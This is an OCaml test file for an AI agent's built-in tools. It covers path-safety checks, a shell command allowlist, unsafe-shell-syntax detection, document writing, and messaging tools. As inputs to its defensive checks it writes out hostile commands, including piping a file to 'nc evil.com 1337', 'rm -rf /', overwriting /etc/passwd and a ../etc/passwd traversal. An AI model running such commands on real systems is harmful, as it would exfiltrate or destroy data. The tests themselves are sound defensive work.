(* Tests for Tools_builtin module (path safety, allowlist, etc.) *)

let ws = "/workspace/test"

let with_temp_workspace f =
  let dir = Filename.temp_file "clawq_tools_prop" "" in
  Sys.remove dir;
  Unix.mkdir dir 0o755;
  Fun.protect
    (fun () -> f dir)
    ~finally:(fun () -> try Unix.rmdir dir with _ -> ())

let process_exists pid =
  try
    Unix.kill pid 0;
    true
  with Unix.Unix_error _ -> false

let contains hay needle =
  try
    ignore (Str.search_forward (Str.regexp_string needle) hay 0);
    true
  with Not_found -> false

let extract_saved_output_path result =
  try
    ignore
      (Str.search_forward
         (Str.regexp "full stdout saved to \\([^ ]+\\)")
         result 0);
    Some (Str.matched_group 1 result)
  with Not_found -> None

let random_segment state =
  match Random.State.int state 10 with
  | 0 -> ""
  | 1 -> "."
  | 2 -> ".."
  | 3 -> "src"
  | 4 -> "lib"
  | 5 -> "tmp"
  | 6 -> Printf.sprintf "dir%d" (Random.State.int state 20)
  | 7 -> Printf.sprintf "file%d.txt" (Random.State.int state 20)
  | 8 -> "test-evil"
  | _ -> "nested"

let random_path_case state ~workspace =
  let seg_count = Random.State.int state 7 in
  let segs = List.init seg_count (fun _ -> random_segment state) in
  let body = String.concat "/" segs in
  match Random.State.int state 5 with
  | 0 -> body
  | 1 -> workspace ^ "/" ^ body
  | 2 -> "/tmp/" ^ body
  | 3 -> workspace ^ "/../" ^ body
  | _ -> workspace ^ "/./" ^ body

let random_shell_char state =
  let chars =
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 \
     ./_-\"'\\;|&><`()$!\t\n\
     \r"
  in
  chars.[Random.State.int state (String.length chars)]

let random_shell_string state =
  let len = Random.State.int state 32 in
  String.init len (fun _ -> random_shell_char state)

let assert_no_drift label =
  let path_drift, shell_drift, tokenizer_drift =
    Tools_builtin.get_drift_counters ()
  in
  Alcotest.(check int) (label ^ " path drift") 0 path_drift;
  Alcotest.(check int) (label ^ " shell drift") 0 shell_drift;
  Alcotest.(check int) (label ^ " tokenizer drift") 0 tokenizer_drift

let with_drift_check label f =
  Tools_builtin.reset_drift_counters ();
  Fun.protect f ~finally:(fun () -> assert_no_drift label)

(* --- normalize_path tests --- *)

let test_normalize_absolute () =
  let result = Tools_builtin.normalize_path "/foo/bar/baz" in
  Alcotest.(check string) "absolute path normalized" "/foo/bar/baz" result

let test_normalize_dot () =
  let result = Tools_builtin.normalize_path "/foo/./bar" in
  Alcotest.(check string) "dot removed" "/foo/bar" result

let test_normalize_dotdot () =
  let result = Tools_builtin.normalize_path "/foo/bar/../baz" in
  Alcotest.(check string) "dotdot resolved" "/foo/baz" result

let test_normalize_relative () =
  let result = Tools_builtin.normalize_path "foo/bar" in
  Alcotest.(check string) "relative path" "foo/bar" result

let test_normalize_empty_segments () =
  let result = Tools_builtin.normalize_path "/foo//bar" in
  Alcotest.(check string) "double slash normalized" "/foo/bar" result

(* --- is_path_safe tests (Coq-extracted) --- *)

let test_path_safe_inside_workspace () =
  with_drift_check "path safe inside workspace" (fun () ->
      let result =
        Tools_builtin.is_path_safe ~workspace:ws (ws ^ "/file.txt")
      in
      Alcotest.(check bool) "file inside workspace is safe" true result)

let test_path_safe_workspace_root () =
  with_drift_check "path safe workspace root" (fun () ->
      let result = Tools_builtin.is_path_safe ~workspace:ws ws in
      Alcotest.(check bool) "workspace root itself is safe" true result)

let test_path_safe_outside_workspace () =
  with_drift_check "path safe outside workspace" (fun () ->
      let result = Tools_builtin.is_path_safe ~workspace:ws "/etc/passwd" in
      Alcotest.(check bool) "outside workspace is unsafe" false result)

let test_path_safe_dotdot_escape () =
  with_drift_check "path safe dotdot escape" (fun () ->
      let result =
        Tools_builtin.is_path_safe ~workspace:ws (ws ^ "/../etc/passwd")
      in
      Alcotest.(check bool) "dotdot escape is unsafe" false result)

let test_path_safe_sibling_dir () =
  (* /workspace/test2 is a sibling, not inside /workspace/test *)
  with_drift_check "path safe sibling dir" (fun () ->
      let result =
        Tools_builtin.is_path_safe ~workspace:ws "/workspace/test2/file"
      in
      Alcotest.(check bool) "sibling dir is unsafe" false result)

let test_path_safe_nested () =
  with_drift_check "path safe nested" (fun () ->
      let result =
        Tools_builtin.is_path_safe ~workspace:ws (ws ^ "/a/b/c/deep/file.ml")
      in
      Alcotest.(check bool) "deeply nested path is safe" true result)

let test_path_safe_prefix_trick () =
  (* /workspace/test-evil should not match /workspace/test *)
  with_drift_check "path safe prefix trick" (fun () ->
      let result =
        Tools_builtin.is_path_safe ~workspace:ws "/workspace/test-evil/file"
      in
      Alcotest.(check bool) "prefix trick is unsafe" false result)

(* --- is_command_allowed tests --- *)

let test_command_allowed_in_list () =
  let allowed = [ "ls"; "cat"; "grep" ] in
  Alcotest.(check bool)
    "ls is allowed" true
    (Tools_builtin.is_command_allowed ~allowed_commands:allowed "ls /tmp")

let test_command_not_in_list () =
  let allowed = [ "ls"; "cat" ] in
  Alcotest.(check bool)
    "rm not allowed" false
    (Tools_builtin.is_command_allowed ~allowed_commands:allowed "rm -rf /")

let test_command_empty_string () =
  let allowed = [ "ls" ] in
  Alcotest.(check bool)
    "empty command not allowed" false
    (Tools_builtin.is_command_allowed ~allowed_commands:allowed "")

let test_command_with_path_prefix () =
  let allowed = [ "ls" ] in
  Alcotest.(check bool)
    "/usr/bin/ls is allowed via basename" true
    (Tools_builtin.is_command_allowed ~allowed_commands:allowed "/usr/bin/ls")

let test_command_with_args () =
  let allowed = [ "git" ] in
  Alcotest.(check bool)
    "git with args is allowed" true
    (Tools_builtin.is_command_allowed ~allowed_commands:allowed "git status")

let test_command_env_var_prefix () =
  let allowed = [ "make" ] in
  Alcotest.(check bool)
    "env var prefix skipped" true
    (Tools_builtin.is_command_allowed ~allowed_commands:allowed
       "FOO=bar make build")

let test_command_default_allowlist_includes_basics () =
  let allowed = Tools_builtin.default_shell_allowlist in
  Alcotest.(check bool) "ls in default list" true (List.mem "ls" allowed);
  Alcotest.(check bool) "cat in default list" true (List.mem "cat" allowed);
  Alcotest.(check bool) "git in default list" true (List.mem "git" allowed)

(* --- has_unsafe_shell_syntax tests --- *)

let test_safe_command_no_special () =
  with_drift_check "safe command no special chars" (fun () ->
      Alcotest.(check bool)
        "simple command is safe" false
        (Tools_builtin.has_unsafe_shell_syntax "ls -la"))

let test_unsafe_semicolon () =
  with_drift_check "unsafe semicolon" (fun () ->
      Alcotest.(check bool)
        "semicolon is unsafe" true
        (Tools_builtin.has_unsafe_shell_syntax "ls; rm -rf /"))

let test_unsafe_pipe () =
  with_drift_check "unsafe pipe" (fun () ->
      Alcotest.(check bool)
        "pipe is unsafe" true
        (Tools_builtin.has_unsafe_shell_syntax "cat file | nc evil.com 1337"))

let test_unsafe_redirect () =
  with_drift_check "unsafe redirect" (fun () ->
      Alcotest.(check bool)
        "redirect is unsafe" true
        (Tools_builtin.has_unsafe_shell_syntax "echo x > /etc/passwd"))

let test_unsafe_dollar_paren () =
  with_drift_check "unsafe dollar paren" (fun () ->
      Alcotest.(check bool)
        "command substitution is unsafe" true
        (Tools_builtin.has_unsafe_shell_syntax "echo $(whoami)"))

let test_unsafe_backtick () =
  with_drift_check "unsafe backtick" (fun () ->
      Alcotest.(check bool)
        "backtick is unsafe" true
        (Tools_builtin.has_unsafe_shell_syntax "echo `whoami`"))

let test_unsafe_ampersand () =
  with_drift_check "unsafe ampersand" (fun () ->
      Alcotest.(check bool)
        "ampersand is unsafe" true
        (Tools_builtin.has_unsafe_shell_syntax "sleep 100 &"))

(* --- extract_command tests --- *)

let test_extract_command_simple () =
  Alcotest.(check string)
    "extracts ls" "ls"
    (Tools_builtin.extract_command "ls -la")

let test_extract_command_with_path () =
  Alcotest.(check string)
    "extracts basename" "ls"
    (Tools_builtin.extract_command "/usr/bin/ls -la")

let test_extract_command_env_prefix () =
  Alcotest.(check string)
    "skips env prefix" "make"
    (Tools_builtin.extract_command "FOO=bar BAZ=qux make build")

let test_extract_command_empty () =
  Alcotest.(check string) "empty" "." (Tools_builtin.extract_command "")

let test_extract_command_only_env () =
  Alcotest.(check string)
    "only env" ""
    (Tools_builtin.extract_command "FOO=bar")

let test_normalize_trailing_slash () =
  let result = Tools_builtin.normalize_path "/foo/bar/" in
  Alcotest.(check string) "trailing slash" "/foo/bar" result

let test_normalize_root () =
  let result = Tools_builtin.normalize_path "/" in
  Alcotest.(check string) "root" "/" result

let test_path_safe_symlink_like () =
  with_drift_check "path safe symlink like" (fun () ->
      let result = Tools_builtin.is_path_safe ~workspace:ws (ws ^ "/./foo") in
      Alcotest.(check bool) "dot in path safe" true result)

let test_unsafe_double_ampersand () =
  with_drift_check "unsafe double ampersand" (fun () ->
      Alcotest.(check bool)
        "double amp" true
        (Tools_builtin.has_unsafe_shell_syntax "ls && rm -rf /"))

let test_safe_single_command_with_flags () =
  with_drift_check "safe command with flags" (fun () ->
      Alcotest.(check bool)
        "flags safe" false
        (Tools_builtin.has_unsafe_shell_syntax "git log --oneline -n 10"))

let test_path_safe_symlink_resolves_inside_workspace () =
  with_temp_workspace (fun workspace ->
      with_drift_check "path safe symlink resolves inside workspace" (fun () ->
          let real_dir = Filename.concat workspace "real" in
          let real_file = Filename.concat real_dir "note.txt" in
          let link_dir = Filename.concat workspace "link" in
          Unix.mkdir real_dir 0o755;
          let oc = open_out real_file in
          output_string oc "ok\n";
          close_out oc;
          Unix.symlink real_dir link_dir;
          let result =
            Tools_builtin.is_path_safe ~workspace
              (Filename.concat link_dir "note.txt")
          in
          Alcotest.(check bool)
            "symlink into workspace remains safe" true result;
          Sys.remove real_file;
          Unix.unlink link_dir;
          Unix.rmdir real_dir))

let test_path_safety_random_conformance () =
  let state = Random.State.make [| 0xC1; 0xA0; 0x42 |] in
  with_temp_workspace (fun workspace ->
      Tools_builtin.reset_drift_counters ();
      for _ = 1 to 500 do
        let path = random_path_case state ~workspace in
        let resolved_for_coq =
          if Filename.is_relative path then Filename.concat workspace path
          else path
        in
        let expected =
          Tools_builtin.is_path_safe_coq ~workspace resolved_for_coq
          && Tools_builtin.is_path_safe_ocaml ~workspace path
        in
        let actual = Tools_builtin.is_path_safe ~workspace path in
        Alcotest.(check bool)
          (Printf.sprintf "path conformance for %S" path)
          expected actual
      done;
      assert_no_drift "path random conformance")

let test_shell_safety_random_conformance () =
  let state = Random.State.make [| 0x51; 0xE1; 0x99 |] in
  let commands =
    [
      "";
      "ls $HOME";
      "echo !";
      "printf 'unterminated";
      "printf \"unterminated";
      "echo \"a\\\"b\"";
      "line1\nline2";
      "line1\rline2";
      "caf\195\169";
      "snowman-\226\152\131";
      "emoji-\240\159\152\128";
    ]
    @ List.init 500 (fun _ -> random_shell_string state)
  in
  with_drift_check "shell random conformance" (fun () ->
      List.iter
        (fun cmd ->
          let expected_unsafe =
            Tools_builtin.has_unsafe_shell_syntax_ocaml cmd
          in
          let actual_unsafe = Tools_builtin.has_unsafe_shell_syntax cmd in
          Alcotest.(check bool)
            (Printf.sprintf "shell syntax conformance for %S" cmd)
            expected_unsafe actual_unsafe;
          let expected_split = Tools_builtin.split_command_words_ocaml cmd in
          let actual_split = Tools_builtin.split_command_words cmd in
          Alcotest.(check (result (list string) string))
            (Printf.sprintf "shell tokenizer conformance for %S" cmd)
            expected_split actual_split)
        commands)

let make_tmp_workspace () =
  let dir =
    Filename.get_temp_dir_name ()
    ^ "/clawq_doc_test_"
    ^ string_of_int (Random.int 100000)
  in
  (try Sys.mkdir dir 0o755 with _ -> ());
  dir

let test_doc_write_creates () =
  let dir = make_tmp_workspace () in
  let tool =
    Tools_builtin.doc_write ~workspace:dir ~workspace_files:[ "TOOLS.md" ]
  in
  let result =
    Lwt_main.run
      (tool.invoke
         (`Assoc
            [
              ("filename", `String "TOOLS.md");
              ("content", `String "hello world");
            ]))
  in
  Alcotest.(check bool)
    "written" true
    (try
       ignore (Str.search_forward (Str.regexp_string "Written") result 0);
       true
     with Not_found -> false);
  let content =
    let ic = open_in (Filename.concat dir "TOOLS.md") in
    let s = input_line ic in
    close_in ic;
    s
  in
  Alcotest.(check string) "content matches" "hello world" content;
  Sys.remove (Filename.concat dir "TOOLS.md");
  try Sys.rmdir dir with _ -> ()

let test_doc_write_appends () =
  let dir = make_tmp_workspace () in
  let path = Filename.concat dir "NOTES.md" in
  let oc = open_out path in
  output_string oc "first\n";
  close_out oc;
  let tool =
    Tools_builtin.doc_write ~workspace:dir ~workspace_files:[ "TOOLS.md" ]
  in
  let result =
    Lwt_main.run
      (tool.invoke
         (`Assoc
            [
              ("filename", `String "NOTES.md");
              ("content", `String "second\n");
              ("append", `Bool true);
            ]))
  in
  Alcotest.(check bool)
    "appended" true
    (try
       ignore (Str.search_forward (Str.regexp_string "Appended") result 0);
       true
     with Not_found -> false);
  let ic = open_in path in
  let content = really_input_string ic (in_channel_length ic) in
  close_in ic;
  Alcotest.(check string) "content appended" "first\nsecond\n" content;
  Sys.remove path;
  try Sys.rmdir dir with _ -> ()

let test_doc_write_rejects_traversal () =
  let dir = make_tmp_workspace () in
  let tool =
    Tools_builtin.doc_write ~workspace:dir ~workspace_files:[ "TOOLS.md" ]
  in
  let result =
    Lwt_main.run
      (tool.invoke
         (`Assoc
            [
              ("filename", `String "../etc/passwd"); ("content", `String "hack");
            ]))
  in
  Alcotest.(check bool)
    "rejected" true
    (try
       ignore (Str.search_forward (Str.regexp_string "Error:") result 0);
       true
     with Not_found -> false);
  try Sys.rmdir dir with _ -> ()

let test_send_message_uses_send_fn_over_send_progress () =
  let send_fn_called = ref [] in
  let send_progress_called = ref false in
  let tool =
    Tools_builtin.send_message ~rich_send_fn:None
      ~send_fn:
        (Some
           (fun ~text ->
             send_fn_called := text :: !send_fn_called;
             Lwt.return_unit))
  in
  let result =
    Lwt_main.run
      (tool.invoke
         ~context:
           {
             Tool.session_key = Some "telegram:1:1";
             send_progress =
               Some
                 (fun _text ->
                   send_progress_called := true;
                   Lwt.return_unit);
             interrupt_check = None;
           }
         (`Assoc [ ("text", `String "status update") ]))
  in
  Alcotest.(check string) "tool result" "Message sent" result;
  Alcotest.(check (list string))
    "send_fn used" [ "status update" ] (List.rev !send_fn_called);
  Alcotest.(check bool) "send_progress not used" false !send_progress_called

let test_send_message_falls_back_to_notify_channel () =
  let sent = ref [] in
  let tool =
    Tools_builtin.send_message ~rich_send_fn:None
      ~send_fn:
        (Some
           (fun ~text ->
             sent := text :: !sent;
             Lwt.return_unit))
  in
  let result =
    Lwt_main.run (tool.invoke (`Assoc [ ("text", `String "fallback update") ]))
  in
  Alcotest.(check string) "tool result" "Message sent" result;
  Alcotest.(check (list string))
    "fallback send used" [ "fallback update" ] (List.rev !sent)

let test_send_message_errors_without_any_notifier () =
  let tool = Tools_builtin.send_message ~send_fn:None ~rich_send_fn:None in
  let result =
    Lwt_main.run (tool.invoke (`Assoc [ ("text", `String "hello") ]))
  in
  Alcotest.(check bool)
    "error reported" true
    (String.starts_with ~prefix:"Error: no active session notifier" result)

let test_send_message_with_buttons_rich_notifier () =
  let received = ref None in
  let rich_send_fn =
    Some
      (fun ~session_key:_ msg ->
        received := Some msg;
        Lwt.return
          Rich_message.
            { message_id = "42"; callback_ids = [ "cb_0_abc"; "cb_1_def" ] })
  in
  let tool = Tools_builtin.send_message ~send_fn:None ~rich_send_fn in
  let result =
    Lwt_main.run
      (tool.invoke
         ~context:
           {
             Tool.session_key = Some "telegram:1:1";
             send_progress = None;
             interrupt_check = None;
           }
         (`Assoc
            [
              ("text", `String "Pick one:");
              ( "buttons",
                `List
                  [
                    `Assoc [ ("label", `String "Option A") ];
                    `Assoc [ ("label", `String "Option B") ];
                  ] );
            ]))
  in
  Alcotest.(check bool)
    "result mentions buttons" true
    (contains result "2 button(s)");
  Alcotest.(check bool)
    "result has message_id" true
    (contains result "message_id=42");
  match !received with
  | Some (Rich_message.TextWithButtons { text; button_rows }) ->
      Alcotest.(check string) "text" "Pick one:" text;
      Alcotest.(check int) "button rows" 1 (List.length button_rows);
      Alcotest.(check int)
        "buttons in row" 2
        (List.length (List.hd button_rows))
  | _ -> Alcotest.fail "expected TextWithButtons"

let test_send_message_with_buttons_text_fallback () =
  let sent = ref [] in
  let tool =
    Tools_builtin.send_message ~rich_send_fn:None
      ~send_fn:
        (Some
           (fun ~text ->
             sent := text :: !sent;
             Lwt.return_unit))
  in
  let result =
    Lwt_main.run
      (tool.invoke
         (`Assoc
            [
              ("text", `String "Choose:");
              ( "buttons",
                `List
                  [
                    `Assoc [ ("label", `String "Yes") ];
                    `Assoc [ ("label", `String "No") ];
                  ] );
            ]))
  in
  Alcotest.(check bool)
    "result mentions text fallback" true
    (contains result "buttons rendered as text");
  Alcotest.(check bool) "sent something" true (List.length !sent = 1);
  let text = List.hd !sent in
  Alcotest.(check bool)
    "contains numbered buttons" true (contains text "1. Yes");
  Alcotest.(check bool) "contains second button" true (contains text "2. No")

let test_send_message_plain_text_via_rich_notifier () =
  let rich_received = ref None in
  let send_fn_called = ref false in
  let rich_send_fn =
    Some
      (fun ~session_key:_ msg ->
        rich_received := Some msg;
        Lwt.return Rich_message.{ message_id = "0"; callback_ids = [] })
  in
  let tool =
    Tools_builtin.send_message ~rich_send_fn
      ~send_fn:
        (Some
           (fun ~text:_ ->
             send_fn_called := true;
             Lwt.return_unit))
  in
  let result =
    Lwt_main.run
      (tool.invoke
         ~context:
           {
             Tool.session_key = Some "telegram:1:1";
             send_progress = None;
             interrupt_check = None;
           }
         (`Assoc [ ("text", `String "plain text update") ]))
  in
  Alcotest.(check string) "tool result" "Message sent" result;
  Alcotest.(check bool) "send_fn not called" false !send_fn_called;
  match !rich_received with
  | Some (Rich_message.Text text) ->
      Alcotest.(check string) "text routed via rich" "plain text update" text
  | _ -> Alcotest.fail "expected Rich_message.Text via rich_send_fn"

let test_send_message_plain_text_rich_fallback_no_session () =
  let send_fn_called = ref [] in
  let rich_send_fn_called = ref false in
  let rich_send_fn =
    Some
      (fun ~session_key:_ _msg ->
        rich_send_fn_called := true;
        Lwt.return Rich_message.{ message_id = "0"; callback_ids = [] })
  in
  let tool =
    Tools_builtin.send_message ~rich_send_fn
      ~send_fn:
        (Some
           (fun ~text ->
             send_fn_called := text :: !send_fn_called;
             Lwt.return_unit))
  in
  (* No context = no session_key, should fall back to send_fn *)
  let result =
    Lwt_main.run (tool.invoke (`Assoc [ ("text", `String "no session msg") ]))
  in
  Alcotest.(check string) "tool result" "Message sent" result;
  Alcotest.(check bool) "rich_send_fn not called" false !rich_send_fn_called;
  Alcotest.(check (list string))
    "send_fn used as fallback" [ "no session msg" ] (List.rev !send_fn_called)

let test_send_poll_rich_notifier () =
  let received = ref None in
  let rich_send_fn =
    Some
      (fun ~session_key:_ msg ->
        received := Some msg;
        Lwt.return Rich_message.{ message_id = "99"; callback_ids = [] })
  in
  let tool = Tools_builtin.send_poll ~rich_send_fn ~send_fn:None in
  let result =
    Lwt_main.run
      (tool.invoke
         ~context:
           {
             Tool.session_key = Some "telegram:1:1";
             send_progress = None;
             interrupt_check = None;
           }
         (`Assoc
            [
              ("question", `String "Best color?");
              ( "options",
                `List [ `String "Red"; `String "Blue"; `String "Green" ] );
            ]))
  in
  Alcotest.(check bool)
    "result mentions poll sent" true
    (contains result "Poll sent");
  Alcotest.(check bool)
    "result has message_id" true
    (contains result "message_id=99");
  match !received with
  | Some (Rich_message.Poll { question; options; allows_multiple }) ->
      Alcotest.(check string) "question" "Best color?" question;
      Alcotest.(check int) "options count" 3 (List.length options);
      Alcotest.(check bool) "allows_multiple" false allows_multiple
  | _ -> Alcotest.fail "expected Poll"

let test_send_poll_text_fallback () =
  let sent = ref [] in
  let tool =
    Tools_builtin.send_poll ~rich_send_fn:None
      ~send_fn:
        (Some
           (fun ~text ->
             sent := text :: !sent;
             Lwt.return_unit))
  in
  let result =
    Lwt_main.run
      (tool.invoke
         (`Assoc
            [
              ("question", `String "Favorite?");
              ("options", `List [ `String "A"; `String "B" ]);
            ]))
  in
  Alcotest.(check bool)
    "result mentions text" true
    (contains result "rendered as text");
  Alcotest.(check bool) "sent something" true (List.length !sent = 1);
  let text = List.hd !sent in
  Alcotest.(check bool) "contains question" true (contains text "Favorite?");
  Alcotest.(check bool) "contains option 1" true (contains text "1. A");
  Alcotest.(check bool) "contains option 2" true (contains text "2. B")

let test_send_poll_validation () =
  let tool = Tools_builtin.send_poll ~rich_send_fn:None ~send_fn:None in
  let result_empty_q =
    Lwt_main.run
      (tool.invoke
         (`Assoc
            [
              ("question", `String "");
              ("options", `List [ `String "A"; `String "B" ]);
            ]))
  in
  Alcotest.(check bool)
    "empty question error" true
    (contains result_empty_q "question is required");
  let result_too_few =
    Lwt_main.run
      (tool.invoke
         (`Assoc
            [
              ("question", `String "Q?");
              ("options", `List [ `String "Only one" ]);
            ]))
  in
  Alcotest.(check bool)
    "too few options error" true
    (contains result_too_few "at least 2");
  let result_too_many =
    Lwt_main.run
      (tool.invoke
         (`Assoc
            [
              ("question", `String "Q?");
              ( "options",
                `List (List.init 11 (fun i -> `String (string_of_int i))) );
            ]))
  in
  Alcotest.(check bool)
    "too many options error" true
    (contains result_too_many "at most 10")

let test_rich_message_to_fallback_text () =
  let text_msg = Rich_message.Text "hello" in
  Alcotest.(check string)
    "Text fallback" "hello"
    (Rich_message.to_fallback_text text_msg);
  let btn_msg =
    Rich_message.TextWithButtons
      {
        text = "Choose:";
        button_rows =
          [
            [
              Rich_message.{ label = "A"; callback_id = "cb_0" };
              Rich_message.{ label = "B"; callback_id = "cb_1" };
            ];
          ];
      }
  in
  let btn_text = Rich_message.to_fallback_text btn_msg in
  Alcotest.(check bool)
    "buttons fallback has text" true
    (contains btn_text "Choose:");
  Alcotest.(check bool)
    "buttons fallback has 1. A" true (contains btn_text "1. A");
  Alcotest.(check bool)
    "buttons fallback has 2. B" true (contains btn_text "2. B");
  let poll_msg =
    Rich_message.Poll
      {
        question = "Best?";
        options = [ "X"; "Y"; "Z" ];
        allows_multiple = false;
      }
  in
  let poll_text = Rich_message.to_fallback_text poll_msg in
  Alcotest.(check bool)
    "poll fallback has question" true
    (contains poll_text "Best?");
  Alcotest.(check bool)
    "poll fallback has 1. X" true
    (contains poll_text "1. X");
  Alcotest.(check bool)
    "poll fallback has 3. Z" true
    (contains poll_text "3. Z")

let test_doc_write_known_file () =
  let dir = make_tmp_workspace () in
  let tool =
    Tools_builtin.doc_write ~workspace:dir ~workspace_files:[ "TOOLS.md" ]
  in
  let result =
    Lwt_main.run
      (tool.invoke
         (`Assoc
            [ ("filename", `String "TOOLS.md"); ("content", `String "data") ]))
  in
  Alcotest.(check bool)
    "mentions active" true
    (try
       ignore
         (Str.search_forward
            (Str.regexp_string "active workspace file")
            result 0);
       true
     with Not_found -> false);
  let result_unknown =
    Lwt_main.run
      (tool.invoke
         (`Assoc
            [ ("filename", `String "RANDOM.md"); ("content", `String "data") ]))
  in
  Alcotest.(check bool)
    "mentions not in list" true
    (try
       ignore
         (Str.search_forward
            (Str.regexp_string "not in workspace_files")
            result_unknown 0);
       true
     with Not_found -> false);
  (try Sys.remove (Filename.concat dir "TOOLS.md") with _ -> ());
  (try Sys.remove (Filename.concat dir "RANDOM.md") with _ -> ());
  try Sys.rmdir dir with _ -> ()

let test_web_search_reads_live_config_after_registry_refresh () =
  let base = Runtime_config.default in
  let registry = Tool_registry.create () in
  let not_configured = { base with web_search = None } in
  let configured =
    {
      base with
      web_search =
        Some
          {
            Runtime_config.search_provider = "brave";
            search_api_key = "reloaded-key";
            num_results = 7;
            search_base_url =
              Some "https://brave.example.invalid/res/v1/web/search";
          };
    }
  in
  Tool_registry.register registry
    (Tools_builtin.web_search ~config:not_configured);
  let tool1 = Option.get (Tool_registry.find registry "web_search") in
  let out1 =
    Lwt_main.run (tool1.invoke (`Assoc [ ("query", `String "clawq") ]))
  in
  Alcotest.(check string)
    "initial tool reports missing config"
    "Error: web_search not configured. Add a \"web_search\" section to \
     ~/.clawq/config.json with provider and api_key."
    out1;
  Tool_registry.replace registry (Tools_builtin.web_search ~config:configured);
  let tool2 = Option.get (Tool_registry.find registry "web_search") in
  let out2 =
    Lwt_main.run
      (tool2.invoke (`Assoc [ ("query", `String "clawq"); ("limit", `Int 7) ]))
  in
  Alcotest.(check bool)
    "replaced tool no longer uses missing-config closure" true
    (not (String.equal out2 out1))

let test_registry_remove_drops_tool () =
  let registry = Tool_registry.create () in
  let base = Runtime_config.default in
  let configured =
    {
      base with
      web_search =
        Some
          {
            Runtime_config.search_provider = "brave";
            search_api_key = "k";
            num_results = 5;
            search_base_url = None;
          };
    }
  in
  Tool_registry.register registry (Tools_builtin.web_search ~config:configured);
  Alcotest.(check bool)
    "tool present before remove" true
    (Tool_registry.find registry "web_search" <> None);
  Tool_registry.remove registry "web_search";
  Alcotest.(check bool)
    "tool absent after remove" true
    (Tool_registry.find registry "web_search" = None)

let test_zai_websearch_requires_api_key () =
  let tool = Tools_builtin.zai_websearch ~config:Runtime_config.default in
  let out =
    Lwt_main.run (tool.Tool.invoke (`Assoc [ ("query", `String "clawq") ]))
  in
  Alcotest.(check string)
    "missing key error"
    "Error: Z.ai API key not configured. Add a \"zai_mcp\" section to \
     ~/.clawq/config.json with \"enabled\": true, or set providers.zai.api_key \
     / providers.zai_coding.api_key."
    out

let test_register_builtin_tools_includes_enabled_zai_tools () =
  let registry = Tool_registry.create () in
  let sandbox =
    Sandbox.create ~backend:Sandbox.None ~workspace:"." ~extra_allowed_paths:[]
      ~workspace_only:false ()
  in
  let config =
    {
      Runtime_config.default with
      zai_mcp =
        Some
          {
            Runtime_config.key = "sk-zai";
            websearch_enabled = true;
            webfetch_enabled = false;
          };
    }
  in
  Tools_builtin.register_all ~config ~sandbox registry;
  Alcotest.(check bool)
    "zai_websearch registered" true
    (Tool_registry.find registry "zai_websearch" <> None);
  Alcotest.(check bool)
    "zai_webfetch omitted when disabled" true
    (Tool_registry.find registry "zai_webfetch" = None)

let test_refresh_replaces_config_bound_tools () =
  let base = Runtime_config.default in
  let registry = Tool_registry.create () in
  let cfg1 = { base with stt = None } in
  Tool_registry.register registry (Tools_builtin.transcribe ~config:cfg1);
  let t1 = Option.get (Tool_registry.find registry "transcribe") in
  let cfg2 =
    {
      base with
      stt =
        Some
          {
            Runtime_config.provider = "openai";
            model = "whisper-1";
            language = None;
          };
    }
  in
  Tool_registry.replace registry (Tools_builtin.transcribe ~config:cfg2);
  let t2 = Option.get (Tool_registry.find registry "transcribe") in
  Alcotest.(check bool) "replace swaps to new tool instance" true (t1 != t2);
  Alcotest.(check int)
    "registry has exactly one transcribe" 1
    (List.length
       (List.filter
          (fun (t : Tool.t) -> t.name = "transcribe")
          (Tool_registry.list registry)))

let test_shell_exec_saves_full_output_when_truncated () =
  with_temp_workspace (fun workspace ->
      let sandbox =
        Sandbox.create ~backend:Sandbox.None ~workspace ~extra_allowed_paths:[]
          ~workspace_only:false ()
      in
      let tool =
        Tools_builtin.shell_exec ~workspace ~workspace_only:false
          ~allowed_commands:[] ~extra_allowed_paths:[] ~sandbox
      in
      let long_text = String.make 25050 'x' in
      let py = Printf.sprintf "python - <<'PY'\nprint(%S)\nPY" long_text in
      let result =
        Lwt_main.run (tool.Tool.invoke (`Assoc [ ("command", `String py) ]))
      in
      Alcotest.(check bool)
        "mentions saved stdout path" true
        (Option.is_some (extract_saved_output_path result));
      let path = Option.get (extract_saved_output_path result) in
      let ic = open_in path in
      let saved = really_input_string ic (in_channel_length ic) in
      close_in ic;
      Alcotest.(check int)
        "saved output preserves full size"
        (String.length long_text + 1)
        (String.length saved);
      Sys.remove path)

let test_shell_exec_head_and_tail_window_output () =
  with_temp_workspace (fun workspace ->
      let sandbox =
        Sandbox.create ~backend:Sandbox.None ~workspace ~extra_allowed_paths:[]
          ~workspace_only:false ()
      in
      let tool =
        Tools_builtin.shell_exec ~workspace ~workspace_only:false
          ~allowed_commands:[] ~extra_allowed_paths:[] ~sandbox
      in
      let command =
        "printf 'o1\no2\no3\no4\no5' && printf 'e1\ne2\ne3\ne4\ne5' 1>&2"
      in
      let result =
        Lwt_main.run
          (tool.Tool.invoke
             (`Assoc
                [
                  ("command", `String command);
                  ("head", `Int 2);
                  ("tail", `Int 2);
                ]))
      in
      Alcotest.(check bool)
        "stdout head visible" true (contains result "o1\no2");
      Alcotest.(check bool)
        "stdout tail visible" true (contains result "o4\no5");
      Alcotest.(check bool) "stdout middle omitted" false (contains result "o3");
      Alcotest.(check bool)
        "stderr head visible" true (contains result "e1\ne2");
      Alcotest.(check bool)
        "stderr tail visible" true (contains result "e4\ne5");
      Alcotest.(check bool) "stderr middle omitted" false (contains result "e3");
      Alcotest.(check bool)
        "window marker visible" true
        (contains result "showing first 2 and last 2 of 5"))

let test_shell_exec_head_tail_window_handles_trailing_newline () =
  with_temp_workspace (fun workspace ->
      let sandbox =
        Sandbox.create ~backend:Sandbox.None ~workspace ~extra_allowed_paths:[]
          ~workspace_only:false ()
      in
      let tool =
        Tools_builtin.shell_exec ~workspace ~workspace_only:false
          ~allowed_commands:[] ~extra_allowed_paths:[] ~sandbox
      in
      let command =
        "printf 'o1\no2\no3\no4\no5\n' && printf 'e1\ne2\ne3\ne4\ne5\n' 1>&2"
      in
      let result =
        Lwt_main.run
          (tool.Tool.invoke
             (`Assoc
                [
                  ("command", `String command);
                  ("head", `Int 2);
                  ("tail", `Int 2);
                ]))
      in
      Alcotest.(check bool)
        "stdout trailing newline tail visible" true (contains result "o4\no5");
      Alcotest.(check bool)
        "stderr trailing newline tail visible" true (contains result "e4\ne5");
      Alcotest.(check bool)
        "no blank tail line" false
        (contains result "o5\n\n[full stdout saved"
        || contains result "e5\n\n[full stderr saved");
      Alcotest.(check bool)
        "window marker counts logical lines" true
        (contains result "showing first 2 and last 2 of 5"))

